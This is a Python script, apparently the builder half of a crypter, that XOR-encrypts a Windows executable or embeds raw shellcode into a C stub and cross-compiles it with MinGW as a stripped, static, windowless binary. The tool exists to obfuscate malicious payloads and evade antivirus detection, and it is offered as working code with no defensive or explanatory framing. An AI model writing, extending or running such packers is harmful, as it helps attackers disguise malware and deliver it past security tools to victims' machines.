#!/usr/bin/env python3
import sys, random, subprocess
from pathlib import Path

import lief

def random_key() -> int:
    return random.randrange(1, 0x100)

def xor_bytes(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)

def to_c_array(data: bytes) -> str:
    # returns "0x12,0x34,0x56,…"
    return ','.join(f'0x{b:02x}' for b in data)

def load_stub() -> str:
    return Path('stub.c').read_text()

def compile_stub(code: str, out_exe: Path, compiler: str, shellcode_mode: bool):
    tmp_c = Path('filled_stub.c')
    tmp_c.write_text(code)

    cmd = [compiler]
    if shellcode_mode:
        cmd.append('-DSHELLCODE_MODE')
    cmd += [
        str(tmp_c),
        '-o', str(out_exe),
        '-O2', '-s',
        '-static',
        '-Wl,--subsystem,windows'
    ]

    print(f"[*] Compiling: {' '.join(cmd)}")
    subprocess.run(cmd, check=True)
    print(f"[+] Built: {out_exe}")

def obf_exe(path: Path):
    data = path.read_bytes()
    key  = random_key()
    enc  = xor_bytes(data, key)
    print(f"[*] XOR key = 0x{key:02x}")

    # Detect x86 vs x64
    pe      = lief.PE.parse(str(path))
    machine = pe.header.machine
    if   machine == lief.PE.Header.MACHINE_TYPES.AMD64:
        compiler, arch_s = 'x86_64-w64-mingw32-gcc', 'x64'
    elif machine == lief.PE.Header.MACHINE_TYPES.I386:
        compiler, arch_s = 'i686-w64-mingw32-gcc', 'x86'
    else:
        sys.exit(f"[!] Unsupported PE machine: {machine}")

    print(f"[*] Detected {arch_s} EXE → using {compiler}")

    stub     = load_stub()
    bytestr  = to_c_array(enc)
    # HERE we inject only the comma-list; braces are in stub.c
    filled   = stub.replace('PAYLOAD_BYTES', bytestr)\
                   .replace('PAYLOAD_KEY',    str(key))

    out_dir = Path('artifacts') / path.stem
    out_dir.mkdir(parents=True, exist_ok=True)
    out_exe  = out_dir / f"obf_{path.name}"

    compile_stub(filled, out_exe, compiler, shellcode_mode=False)

def obf_shellcode(path: Path):
    raw = path.read_bytes()
    print(f"[*] Embedding {len(raw)} bytes of shellcode")

    stub    = load_stub()
    bytestr = to_c_array(raw)
    filled  = stub.replace('PAYLOAD_BYTES', bytestr)

    arch = ''
    while arch not in ('x86','x64'):
        arch = input("Architecture (x86/x64): ").strip().lower()
    compiler = 'x86_64-w64-mingw32-gcc' if arch=='x64' else 'i686-w64-mingw32-gcc'

    out_dir = Path('artifacts') / path.stem
    out_dir.mkdir(parents=True, exist_ok=True)
    out_exe  = out_dir / f"obf_{path.stem}_{arch}.exe"

    compile_stub(filled, out_exe, compiler, shellcode_mode=True)

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <payload-file>")
        sys.exit(1)

    payload = Path(sys.argv[1])
    if not payload.exists():
        sys.exit(f"[!] File not found: {payload}")

    if payload.suffix.lower() == '.exe':
        obf_exe(payload)
    else:
        obf_shellcode(payload)

if __name__ == '__main__':
    main()
